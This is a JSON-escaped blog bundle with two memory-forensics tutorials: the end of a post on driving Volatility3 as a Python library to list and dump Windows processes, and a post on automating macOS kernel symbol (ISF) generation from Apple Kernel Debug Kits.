\\"plugins.PsList.kernel.layer_name.class\\": \\"volatility3.framework.layers.intel.WindowsIntel32e\\",\\n   \\"plugins.PsList.kernel.layer_name.kernel_virtual_offset\\": 272678925664256,\\n   \\"plugins.PsList.kernel.layer_name.memory_layer\\": \\"memory_layer\\",\\n   \\"plugins.PsList.kernel.layer_name.memory_layer.class\\": \\"volatility3.framework.layers.physical.FileLayer\\",\\n   \\"plugins.PsList.kernel.layer_name.memory_layer.location\\": \\"file:///REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/Triage-Memory.mem\\",\\n   \\"plugins.PsList.kernel.layer_name.page_map_offset\\": 1601536,\\n   \\"plugins.PsList.kernel.layer_name.swap_layers\\": true,\\n   \\"plugins.PsList.kernel.layer_name.swap_layers.number_of_elements\\": 0,\\n   \\"plugins.PsList.kernel.offset\\": 272678925664256,\\n   \\"plugins.PsList.kernel.symbol_table_name\\": \\"symbol_table_name1\\",\\n   \\"plugins.PsList.kernel.symbol_table_name.class\\": \\"volatility3.framework.symbols.windows.WindowsKernelIntermedSymbols\\",\\n   \\"plugins.PsList.kernel.symbol_table_name.isf_url\\": \\"file:///REDACTED/REDACTED/REDACTED/REDACTED/python/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/2E37F962D699492CAAF3F9F4E9770B1D-2.json.xz\\",\\n   \\"plugins.PsList.kernel.symbol_table_name.symbol_mask\\": 0,\\n   \\"plugins.PsList.physical\\": false,\\n   \\"plugins.PsList.pid\\": []\\n }\\n```\\nOnce our plugin is constructed, we can run it. However, we need to specify to volatility how we want to render the output. The framework is providing us with multiple renderers. Let\'s use the \\"pretty text renderer\\" that we have used with the CLI at the begining of the blog and run the plugin.\\n\\n```python\\nimport volatility3.framework\\nfrom volatility3.framework import contexts, interfaces\\nfrom volatility3 import plugins\\nfrom volatility3.framework import automagic\\nfrom volatility3.framework.plugins import construct_plugin\\nfrom volatility3.cli import text_renderer\\nimport logging, os\\n\\nlogging.basicConfig(level=logging.INFO)\\nlogger = logging.getLogger(__name__)\\nvolatility3.framework.require_interface_version(2, 0, 0)\\n\\ndef build_context(image_name ,context, base_config_path, plugin):\\n   available_automagics = automagic.available(context)\\n   plugin_config_path = interfaces.configuration.path_join(base_config_path, plugin.__name__)\\n   automagics = automagic.choose_automagic(available_automagics, plugin)\\n   context.config[\'automagic.LayerStacker.stackers\'] = automagic.stacker.choose_os_stackers(plugin)\\n   context.config[\'automagic.LayerStacker.single_location\'] = \\"file://\\" + os.getcwd() + \\"/\\" + image_name\\n   constructed = construct_plugin(context, automagics, plugin, base_config_path, None, None)\\n   return constructed\\n\\nctx = contexts.Context()  ## Construct a blank context\\nfailures = volatility3.framework.import_files(plugins, True) ##Load the framework plugins\\nif failures:\\n   logger.info(f\\"Some volatility3 plugin couldn\'t be loaded : {failures}\\")\\nelse:\\n   logger.info(f\\"Plugins are loaded without failure\\")\\nplugin_list = volatility3.framework.list_plugins()\\nbase_config_path = \\"plugins\\"\\nconstructed = build_context(\\"Triage-Memory.mem\\", ctx, base_config_path, plugin_list[\'windows.pslist.PsList\'])\\n\\nif constructed:\\n   result = text_renderer.PrettyTextRenderer().render(constructed.run())\\n```\\n\\nOUTPUT :\\n\\n```\\nINFO:__main__:Plugins are loaded without failure\\nINFO:volatility3.framework.automagic:Detected a windows category plugin\\nINFO:volatility3.framework.automagic:Running automagic: ConstructionMagic\\nINFO:volatility3.framework.automagic:Running automagic: LayerStacker\\nINFO:volatility3.framework.automagic:Running automagic: WinSwapLayers\\nINFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner\\nINFO:volatility3.framework.automagic:Running automagic: KernelModule\\nFormatting...\\n |  PID | PPID |  ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                  CreateTime | ExitTime | File output\\n* |    4 |    0 |         System | 0xfa8003c72b30 |      87 |     547 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled\\n* |  252 |    4 |       smss.exe | 0xfa8004616040 |       2 |      30 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled\\n* |  332 |  324 |      csrss.exe | 0xfa80050546b0 |      10 |     516 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n* |  372 |  364 |      csrss.exe | 0xfa800525a9e0 |      11 |     557 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n* |  380 |  324 |    wininit.exe | 0xfa8005259060 |       3 |      78 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n* |  416 |  364 |   winlogon.exe | 0xfa8005268b30 |       3 |     110 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n* |  476 |  380 |   services.exe | 0xfa8005680910 |      12 |     224 |         0 | False | 2019-03-22 05:31:59.000000  |      N/A |    Disabled\\n...\\n\\nGoing further\\n\\nGreat, we now know how to run a simple plugin with no specfic configuration and a default text renderer. In this section, we\'ll try to dump a specific process using the capabilities of the PsList plugin.\\n\\nIf you take a look at the context configuration displayed earlier, you\'ll notice that some options about the PsList plugin are set by default. What if we want to try to dump a specific process ? With the volatility3 CLI, the command is the following :\\n\\n\\n\xbb vol -f Triage-Memory.mem windows.pslist --pid 252 --dump                                                                                                                             k1nd0ne@MacBook-Pro-de-Felix\\nVolatility 3 Framework 2.0.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nPID\\tPPID\\tImageFileName\\tOffset(V)\\tThreads\\tHandles\\tSessionId\\tWow64\\tCreateTime\\tExitTime\\tFile output\\n\\n252\\t4\\tsmss.exe\\t0xfa8004616040\\t2\\t30\\tN/A\\tFalse\\t2019-03-22 05:31:55.000000 \\tN/A\\tpid.252.0x48430000.dmp\\n\\nThe arguments we specified are the PID, which is the process ID we want to filter, and the DUMP option, which means that we want to dump the list of the filtered processes.\\nIf we take a look at the plugin context configuration, the entries reponsible are the following :\\n\\"plugins.PsList.pid\\": []\\n\\"plugins.PsList.dump\\": false In our code, we just have to clarify those two values:\\n\\n\\n...\\nctx.config[\\"plugins.PsList.pid\\"] = [252]\\nctx.config[\\"plugins.PsList.dump\\"] = True\\nconstructed = build_context(\\"Triage-Memory.mem\\", ctx, base_config_path, plugin_list[\'windows.pslist.PsList\'])\\n```\\nOUTPUT :\\n\\n```                                                                                                                                                                       1 \u21b5 k1nd0ne@MacBook-Pro-de-Felix\\nINFO:__main__:Plugins are loaded without failure\\nINFO:volatility3.framework.automagic:Detected a windows category plugin\\nINFO:volatility3.framework.automagic:Running automagic: ConstructionMagic\\nINFO:volatility3.framework.automagic:Running automagic: LayerStacker\\nINFO:volatility3.framework.automagic:Running automagic: WinSwapLayers\\nINFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner\\nINFO:volatility3.framework.automagic:Running automagic: KernelModule\\nFormatting...\\n| PID | PPID | ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                  CreateTime | ExitTime |            File output\\n* | 252 |    4 |      smss.exe | 0xfa8004616040 |       2 |      30 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A | pid.252.0x48430000.dmp\\n```\\nThis code will be interpreted without error. However you\'ll never find your process on your drive ! Why ? Well, in the \\"build_context\\" function, I have called the volatility3 framework\'s \\"construct_plugin\\" function with no File Handler Interface. By default, the volatility3 framework lets you decide how to handle files by rewritting the methods (open, write, ...). In this example, we want the file to be directly written in the current directory from where the script is executed. The following code is using the CLIDirectFileHandler from the native framework with a little bit of tweaking. Once integrated into our code, the final result looks like this :\\n\\n```python\\nimport volatility3.framework\\nfrom volatility3.framework import contexts, interfaces\\nfrom volatility3 import plugins\\nfrom volatility3.framework import automagic\\nfrom volatility3.framework.plugins import construct_plugin\\nfrom volatility3.cli import text_renderer\\nimport logging, os, io, tempfile\\n\\n\\ndef file_handler(output_dir):\\n   class CLIFileHandler(interfaces.plugins.FileHandlerInterface):\\n       \\"\\"\\"The FileHandler from Volatility3 CLI\\"\\"\\"\\n       def _get_final_filename(self):\\n           \\"\\"\\"Gets the final filename\\"\\"\\"\\n           if output_dir is None:\\n               raise TypeError(\\"Output directory is not a string\\")\\n           os.makedirs(output_dir, exist_ok = True)\\n\\n           pref_name_array = self.preferred_filename.split(\'.\')\\n           filename, extension = os.path.join(output_dir, \'.\'.join(pref_name_array[:-1])), pref_name_array[-1]\\n           output_filename = f\\"{filename}.{extension}\\"\\n\\n           counter = 1\\n           if os.path.exists(output_filename):\\n               os.remove(output_filename)\\n           return output_filename\\n\\n   class CLIDirectFileHandler(CLIFileHandler):\\n       \\"\\"\\"We want to save our files directly to disk\\"\\"\\"\\n       def __init__(self, filename: str):\\n           fd, self._name = tempfile.mkstemp(suffix = \'.vol3\', prefix = \'tmp_\', dir = output_dir)\\n           self._file = io.open(fd, mode = \'w+b\')\\n           CLIFileHandler.__init__(self, filename)\\n           for item in dir(self._file):\\n               if not item.startswith(\'_\') and not item in [\'closed\', \'close\', \'mode\', \'name\']:\\n                   setattr(self, item, getattr(self._file, item))\\n\\n       def __getattr__(self, item):\\n           return getattr(self._file, item)\\n\\n       @property\\n       def closed(self):\\n           return self._file.closed\\n\\n       @property\\n       def mode(self):\\n           return self._file.mode\\n\\n       @property\\n       def name(self):\\n           return self._file.name\\n\\n       def close(self):\\n           \\"\\"\\"Closes and commits the file (by moving the temporary file to the correct name\\"\\"\\"\\n           ## Don\'t overcommit\\n           if self._file.closed:\\n               return\\n\\n           self._file.close()\\n           output_filename = self._get_final_filename()\\n           os.rename(self._name, output_filename)\\n\\n   return CLIDirectFileHandler\\n\\ndef build_context(image_name ,context, base_config_path, plugin):\\n   available_automagics = automagic.available(context)\\n   plugin_config_path = interfaces.configuration.path_join(base_config_path, plugin.__name__)\\n   automagics = automagic.choose_automagic(available_automagics, plugin)\\n   context.config[\'automagic.LayerStacker.stackers\'] = automagic.stacker.choose_os_stackers(plugin)\\n   context.config[\'automagic.LayerStacker.single_location\'] = \\"file://\\" + os.getcwd() + \\"/\\" + image_name\\n   constructed = construct_plugin(context, automagics, plugin, base_config_path, None, file_handler(os.getcwd()))\\n   return constructed\\n\\n\\nlogging.basicConfig(level=logging.INFO)\\nlogger = logging.getLogger(__name__)\\nvolatility3.framework.require_interface_version(2, 0, 0)\\n\\nctx = contexts.Context()  ## Construct a blank context\\nfailures = volatility3.framework.import_files(plugins, True) ##Load the framework plugins\\nif failures:\\n   logger.info(f\\"Some volatility3 plugin couldn\'t be loaded : {failures}\\")\\nelse:\\n   logger.info(f\\"Plugins are loaded without failure\\")\\nplugin_list = volatility3.framework.list_plugins()\\nbase_config_path = \\"plugins\\"\\nctx.config[\\"plugins.PsList.pid\\"] = [252]\\nctx.config[\\"plugins.PsList.dump\\"] = True\\nconstructed = build_context(\\"Triage-Memory.mem\\", ctx, base_config_path, plugin_list[\'windows.pslist.PsList\'])\\n\\nif constructed:\\n   result = text_renderer.PrettyTextRenderer().render(constructed.run())\\n```\\n\\n\\nThere we go, when interpreted, this script will dump the process with PID 252 using the PsList plugin. Now that you know more about how to use the volatility3 framework libraries, you can imagine any application you want to a real case scenario!\\nConclusion\\n\\nI hope you now have a better understanding of how the volatility3 framework is working behind the scene, how easy it is to exploit and integrate it inside your investigation tools. You can of course write your own renderers to directly inject the results inside a database or any format that suite your needs. VolWeb is using volatility3 as a library and this article is directly linked to the latest release exploiting this capability.\\nYou can check VolWeb by clicking the link below.\\n\\n>This article is written from my own understanding of this subject and any critics you may have are welcomed to make this article evolve. You can contact me at felix.guyard@forensicxlab.com.\\n\\n\\n## References\\n\\n- Volatility3 Documentation : https://volatility3.readthedocs.io/en/stable/using-as-a-library.html\\n- Volatility3 Project : https://github.com/volatilityfoundation/volatility3"},{"id":"macisf","metadata":{"permalink":"/blog/macisf","source":"@site/blog/2022-03-22-macisf/index.md","title":"\ud83d\udcc4 Volatility3 - ISF for MacOs","description":"Being interested in memory forensic for a while now I have learned a lot about the Volatility framework. This article will introduce volatility3 core components and focus on kernel symbols. Next, I will explain the steps I took to generate a lot of MacOs SymbolTables. Finally you will be able to retrieve those SymbolsTables directly from github. The final goal is to create a public repository like windows to automatically identify mac os system version and directly download the associated SymbolTables.","date":"2022-03-22T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"MacOs","permalink":"/blog/tags/mac-os"}],"readingTime":6.76,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"macisf","title":"\ud83d\udcc4 Volatility3 - ISF for MacOs","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","MacOs"]},"unlisted":false,"prevItem":{"title":"\ud83d\udcd8 Using Volatility3 as a library","permalink":"/blog/volaslib"}},"content":"Being interested in memory forensic for a while now I have learned a lot about the Volatility framework. This article will introduce volatility3 core components and focus on kernel symbols. Next, I will explain the steps I took to generate a lot of MacOs SymbolTables. Finally you will be able to retrieve those SymbolsTables directly from github. The final goal is to create a public repository like windows to automatically identify mac os system version and directly download the associated SymbolTables.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Volatility\\n\\nMemory analysis is focusing on the extraction of evidence by exploiting the Random Access Memory (abbreviated to RAM) of a given system. Volaltility is the best state of the art framework to perform digital forensic on RAM after its acquisition. Volatility has become the world\u2019s most widely used memory forensics platform and its python3 version is currently under active development.\\n\\n### Volatility main components\\n\\nWhen doing memory analysis with Volatility3, the memory is split into three major components :\\n\\n- **Memory Layers** : This component allows correct memory mapping and address translation.\\n- **Templates and Objects** :  A template is the representation of what we know about the structure of the final object we want to extract and explore from the memory layer to perform memory forensic.\\n- **Symbol Tables** :\\n  - When a program is compiled, it is aware of its own structures and how they are stored. This means that when doing offline memory analysis, volatility needs to be aware of the context of the program that were executed.\\n  - When the compilation of a program is performed, debugging symbols are produce alongside it. A symbol can be viewed as an address associated to a template.\\n  - We can picture the set of debugging symbols produced at compilation being equal to one SymbolTable which is a JSON structure understandable by volatility.  The more SymbolTable volatility possesses the more symbols and templates it can extract from memory.\\n  - The representation of all of the SymbolTables retrieved by volatility is called the SymbolSpace. The SymbolSpace is stored within the context of the volatility3 framework. When executing volatility3 on a memory dump, it is going to build its context and SymbolSpace from the user\'s provided SymbolTables.\\n\\nAs a memory forensics investigator, our goal will be first to extract the debugging symbols generated by the kernel when compiled which will allow us to identify how the system\'s essential structures are stored in memory. The majority of basic Volatility3 plugging are using the kernel symbols.\\n\\nFor **Windows** memory analysis, Volatility is going to build the context using Windows Program Database (PDB) files which are directly fetched from microsoft website and translated into SymbolTables if not already present locally.\\n\\nFor **Linux**, the task is more complicated. Indeed Linux can be declined into a lot of distributions which are all having a different kernel versions which means different SymbolSpace for each version. If you want to perform memory forensic on a random linux you need to extract the kenel debugging symbols of the target which are not always easy to find according to the distribution.\\n\\nFor **Mac** the task is similar to Linux, however there is only one single distribution. Mac is tracking the system versions and build numbers. For each system version and build number there is different kernel version therefore potentially different kernel debugging symbols.\\n\\nThe first step to even be able to analyse a memory dump is being able to build the right context. Any incident response team or an investigator would gain a fair amount of time not bothering generating SymbolTables. In the next section we will go deeper on how to generate Intermediate Symbol Format (ISF) file for mac and my journey into the automation of the process for a far amount of mac system versions.\\n\\n## MacOs Kernel Debug Kit\\n\\nIf you have an Apple account, you can find what Apple calls \\"Kernel Debug Kits\\" (KDK). For one specific mac os version and build number, the package contains development & debug versions of the macOS kernel. These files contain full symbolic information, unlike the equivalent files in a normal macOS installation. This is exactly what we need to create our SymbolTables. Mac as well as Linux are using DWARF file to represent the kernel with debugging symbols. The VolatilityFoundation created a go program call dwarf2json to parse the appropriate DWARF files into a JSON ISF file to build the SymbolTables. The Kernel Debugging Kits are available here.\\n\\nTherefore here are the goals :\\n- Download all KDK available from Apple\'s website.\\n- Identify the kernel symbols for each version.\\n- Generate the ISF files.\\n- Share and maintain.\\n\\n## Automation\\n\\nThe first step was to download all the KDK which are dmg images from Apple\'s developper website. We can identify that there is 241 available KDK that are covering mac os version 10.4.11_build_8s216 to 12.3_Build_StarESeed21E5212f.\\n\\nI have decided to pick one KDK per major system version to identify the differences in the file structures and where the kernel debugging symbols are located. From there we can begin the script.\\n\\n![alt text](../images/macisf/screenshot.png \\"Downloaded ISF\\")\\n\\n\\nThe major steps are for each KDK :\\n- Extract the pkg file from the dmg image.\\n- Unpack the pkg file.\\n- Find the kernel debugging symbols DWARF files.\\n- Create the IFS JSON file\\n\\n\\nI chose to use python3 for the implementation :\\n```python\\nimport subprocess\\nimport argparse\\nimport logging\\nimport os, os.path\\nimport re\\n\\ndef find_and_generate_kernel_symbols(dir_path, kernel_version):\\n    \\"\\"\\"Generate the ISF file for the kernel DWARF files found\\"\\"\\"\\n    cmd = [\'./dwarf2json\', \'mac\']\\n    for dirpath, dirnames, files in os.walk(dir_path):\\n        for filename in files:\\n            if \\"kernel\\" == filename or \\"mach_kernel\\" == filename:\\n                todo = os.path.join(dirpath, filename)\\n                cmd.append(\'--macho-symbols\')\\n                cmd.append(todo)\\n    logger.info(f\\"Generating volatility ISF for {kernel_version} \\")\\n    with open(\\"ISF/\\"+kernel_version[0]+\\".json\\", \\"a\\") as outfile:\\n        try:\\n            subprocess.run(cmd, stdout=outfile)\\n        except:\\n            logger.error(f\'Could not generate ISF for {todo}\')\\n    try:\\n        subprocess.check_output([\'tar\', \'-cJf\', \\"ISF/\\"+kernel_version[0]+\\".json.xz\\", \\"ISF/\\"+kernel_version[0]+\\".json\\" ])\\n    except:\\n        logger.error(f\'Could not compress ISF into an xz archive\')\\n\\ndef dir_path(string):\\n    \\"\\"\\"Check if the directory passed is indeed a directory\\"\\"\\"\\n    if os.path.isdir(string):\\n        return string\\n    else:\\n        raise NotADirectoryError(string)\\n\\nif __name__ == \'__main__\':\\n    parser = argparse.ArgumentParser(description = \\"Generate all volatility symbole files for the different macOs versions\\")\\n    parser.add_argument(\'--path\', type=dir_path)\\n\\n    \\"\\"\\"init\\"\\"\\"\\n    args = parser.parse_args()\\n    logging.basicConfig(level=logging.INFO)\\n    logger = logging.getLogger(__name__)\\n    logger.info(\'Started\')\\n    src_dir = args.path\\n    reg_exp = r\'[k|K]ern[e|a]l_[d|D]ebug_[K|k]it_(.*)\\\\.dmg\'\\n\\n    \\"\\"\\"routine\\"\\"\\"\\n    for dmg_image in os.listdir(src_dir):\\n        if \\"DS_Store\\" in dmg_image:\\n            continue\\n        kernel_version = re.findall(reg_exp, dmg_image)\\n        logger.info(f\'Kernel version : {kernel_version} \')\\n        logger.info(f\'Extracting {dmg_image}\')\\n        try:\\n            subprocess.check_output([\'7z\', \'x\', src_dir+\\"/\\"+dmg_image])\\n        except subprocess.CalledProcessError as err:\\n            logger.error(f\'Could not extract pkg from : {dmg_image} : {err}\')\\n            continue\\n        try:\\n            kernel_debug_kit_path = dir_path(\\"KernelDebugKit\\")\\n            find_and_generate_kernel_symbols(kernel_debug_kit_path, kernel_version)\\n        except NotADirectoryError:\\n            pass\\n            try:\\n                kernel_debug_kit_path = dir_path(\\"Kernel Debug Kit\\")\\n                logger.info(f\'Extracting pkg...\')\\n                try:\\n                    subprocess.check_output([\'pkgutil\', \'--expand-full\', kernel_debug_kit_path+\\"/KernelDebugKit.pkg\\", \\"KernelDebugKit\\"])\\n                    subprocess.check_output([\'rm\', \'-rf\', kernel_debug_kit_path])\\n                    kernel_debug_kit_path = \\"KernelDebugKit\\"\\n                    find_and_generate_kernel_symbols(kernel_debug_kit_path, kernel_version)\\n                except subprocess.CalledProcessError as err:\\n                    logger.error(f\'Could not extract pkg from : {kernel_debug_kit_path} : {err}\')\\n                    pass\\n\\n            except NotADirectoryError:\\n                logger.error(f\'Could not find the KernelDebugKit directory for {dmg_image}\')\\n                pass\\n        os.system(\\"rm -rf KernelDebugKit\\")\\n```\\nThis script is using the compiled version of dwarf2json located alongside the script. Once this code is executed on the directory containing all the dmg images, the ISF files are extracted from the multiple kernel debug symbols into a \\".xz\\" archive.\\n\\nThis archive type is understandable by volatility3 when building the context.\\n\\n![alt text](../images/macisf/generated.png \\"Result\\")\\n\\n\\n\\n\\nTo conclude, I have learned a lot on how volatility3 works while trying to extract kernel symbols from the apple\'s KDKs. The next steps is to test those symbols and integrate them to VolWeb. Mac memory forensic is also for me a good way to participate to the creation of modules for volatility3.\\n\\nThis article and the code may evolve with time if new discoveries are made. The community is invited to test those symbols on memory dumps. In a future blog post, I will focus on the existing ways to dump memory on a modern mac system and try to provide an automated tool or a new way to perfom this task.\\n\\n\\n> This blog post is written from my own understanding of memory forensic. Don\'t hesitate to reach me at felix.guyard@forensicxlab.com and share your suggestions to make this article more complete."}]}}')}}]);